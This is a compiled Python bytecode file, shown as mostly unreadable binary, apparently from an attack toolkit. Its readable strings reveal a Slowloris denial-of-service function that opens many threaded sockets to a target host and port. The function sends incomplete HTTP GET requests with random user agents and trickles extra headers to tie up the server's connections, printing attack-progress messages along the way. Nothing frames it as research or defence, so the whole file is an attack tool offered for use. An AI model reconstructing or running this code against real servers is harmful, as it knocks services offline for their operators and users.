a
    `v?aF  �                   @   s<   d dl Z d dlZd dlZd dlmZ d dlmZ dd� ZdS )�    N)�Threadc                    s�   da � �d�d �t� �d�d ��td� g }� ��fdd�}td| �D ]4}tdt|� d	 � t|d
�}|��  |�|� qJt	�
|� |D ]}da |��  q�td� d S )NF�:r   �   z+[1;34m[*][0m Starting SLOWLORIS attack...c                     s�   t � t jt j�} | �d� | ���f� | �d�t�dd���	d�� | �d�t
�� ��	d�� | �d�d��	d�� ts�tsvz"| �d	�t�d
d���	d�� W n t jy�   td� Y qv0 td�  d � qvd S )N�   zGET /?{} HTTP/1.1
r   i�  zutf-8zUser-Agent: {}
z{}
zAccept-language: en-US,en,q=0.5z	X-a: {}
r   i�  z'[1;31m[-][0m Failed to create socket!z"[1;34m[*][0m Sending packets to �...)�socketZAF_INETZSOCK_STREAMZ
settimeoutZconnect�send�format�random�randint�encode�
randomDataZrandom_useragent�FINISH�error�print)Zsock��targetZ	target_ipZtarget_port� �8/storage/emulated/0/Script Vip/toolso/other/slowloris.py�slowloris_flood   s    
"z)SLOWLORIS_ATTACK.<locals>.slowloris_floodz[1;34m[*][0m Starting thread r   )r   Tz [1;77m[i][0m Attack completed.)r   �split�intr   �range�strr   �start�append�time�sleep�join)ZthreadsZattack_timer   Zthreads_listr   �thread�tr   r   r   �SLOWLORIS_ATTACK
   s     


r!   )r
   r   r   Z	threadingr   Ztoolso.randomDatar   r!   r   r   r   r   �<module>   s
   